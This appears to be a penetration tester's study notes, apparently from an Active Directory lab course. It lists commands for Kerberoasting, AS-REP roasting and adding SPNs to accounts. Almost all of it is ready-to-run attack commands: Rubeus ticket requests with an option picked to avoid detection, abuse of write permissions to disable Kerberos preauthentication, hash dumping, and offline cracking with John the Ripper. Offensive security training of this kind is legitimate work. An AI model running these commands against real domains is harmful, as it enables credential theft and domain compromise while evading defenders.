Find user accounts used as service accounts
- Active Directory Module
`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
- PowerView
`Get-DomainUser -SPN`
![[assets/Pasted image 20260221004651.png]]



Use Rubeus to list Kerberos stats
`Rubeus.exe kerberoast /stats`
![[assets/Pasted image 20260221004616.png]]

Use Rubeus to request a TGS
`Rubeus.exe kerberoast /user:<user> /simple`
![[assets/Pasted image 20260221005447.png]]


To avoid detections based on Encryption Downgrade for Kerberos EType, look for Kerberoastable accounts that only support RC4-HMAC
`Rubeus.exe kerberoast /stats /rc4opsec`


`Rubeus.exe kerberoast /user:<user> /simple /rc4opsec`
![[assets/Pasted image 20260221005732.png]]


Kerberoast all possible accounts
`Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt`




# AS-REP Roasting

if a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled, you can grab the AS-REP ticket
- with GenericAll or GenericWrite, you can force this setting off

Enumerating accounts with Kerberos preauth disabled
- PowerView
`Get-DomainUser -PreauthNoRequired -Verbose`
- ActiveDirectory Module
`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

Force disable Kerberos preauth
- Let's enumerate the permissions for RDPUsers on ACLs using PowerView
`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`

- disable preauth
`Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose`

- find users with preauth disabled
`Get-DomainUser -PreauthNotRequired -Verbose`


Request encrypted AS-REP for offline brute-force
`C:\AD\Tools\Rubeus.exe asreproast /user:<user> /outfile:path\to\outfile`

Use JtR to brute-force hashes offline
`john.exe --wordlist=path\to\wordlist path\to\outfile`


# Adding SPN

with enough writes (GenericWrite or GenericAll), you can add an SPN for a user

set SPN for the user
`Set-DomainObject -Identity <user> -Set @{serviceprincipalname='<service>/<machine>`
- service can be anything, as long as it doesn't overlap with another in forest
- there is no validation on SPN set, you can use whatever you want 

- Using ActiveDirectory Module
`Set-ADUser -Identity <user> -ServicePrincipalNames @{Add=<service>/<machine>`